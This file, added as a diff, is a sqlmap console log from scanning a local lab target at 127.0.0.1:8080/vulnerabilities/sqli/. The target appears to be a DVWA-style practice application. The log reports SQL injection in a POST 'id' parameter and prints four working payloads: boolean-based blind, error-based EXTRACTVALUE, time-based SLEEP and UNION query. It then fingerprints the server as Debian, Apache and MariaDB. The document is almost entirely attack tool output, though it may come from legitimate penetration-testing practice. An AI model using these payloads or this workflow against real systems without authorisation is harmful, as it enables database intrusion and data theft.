@@ -1,0 +1,85 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.8#pip}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:30:46 /2026-08-14/
+
+[13:30:46] [INFO] testing connection to the target URL
+[13:30:46] [INFO] searching for forms
+[1/1] Form:
+POST http://127.0.0.1:8080/vulnerabilities/sqli/
+Cookie: sha256:3b8b24b5
+POST data: id=1&Submit=Submit
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: id=1&Submit=Submit]: id=1&Submit=Submit
+[13:30:46] [INFO] using '/root/.local/share/sqlmap/output/results-08142026_0130pm.csv' as the CSV results file in multiple targets mode
+[13:30:46] [INFO] checking if the target is protected by some kind of WAF/IPS
+[13:30:46] [INFO] testing if the target URL content is stable
+[13:30:47] [INFO] target URL content is stable
+[13:30:47] [INFO] testing if POST parameter 'id' is dynamic
+[13:30:47] [WARNING] POST parameter 'id' does not appear to be dynamic
+[13:30:47] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[13:30:47] [INFO] testing for SQL injection on POST parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[13:30:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:30:47] [WARNING] reflective value(s) found and filtering out
+[13:30:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[13:30:47] [INFO] POST parameter 'id' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --string="DB")
+[13:30:47] [INFO] testing 'Generic inline queries'
+[13:30:47] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[13:30:47] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[13:30:47] [INFO] testing 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)'
+[13:30:47] [INFO] testing 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)'
+[13:30:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:30:47] [INFO] POST parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
+[13:30:47] [INFO] testing 'MySQL inline queries'
+[13:30:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[13:30:47] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)
+[13:30:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[13:30:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[13:30:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[13:30:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[13:30:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[13:30:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:30:57] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[13:30:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:30:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:30:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[13:30:57] [INFO] target URL appears to have 2 columns in query
+[13:30:57] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (1734=1734) THEN 1 ELSE (SELECT 2936 UNION SELECT 7329) END))&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1 AND EXTRACTVALUE(5310,CONCAT(0x5c,0x71626b6b71,(SELECT (ELT(5310=5310,1))),0x716b786271))&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5651 FROM (SELECT(!SLEEP(5)))hsBR)&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71626b6b71,0x64584d7a7247567574644e6b7a44536b6655656d7976764d5a594b657a77546b69556d43636e6151,0x716b786271)-- -&Submit=Submit
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[13:30:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+[13:30:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08142026_0130pm.csv'
+
+[*] ending @ 13:30:57 /2026-08-14/
+
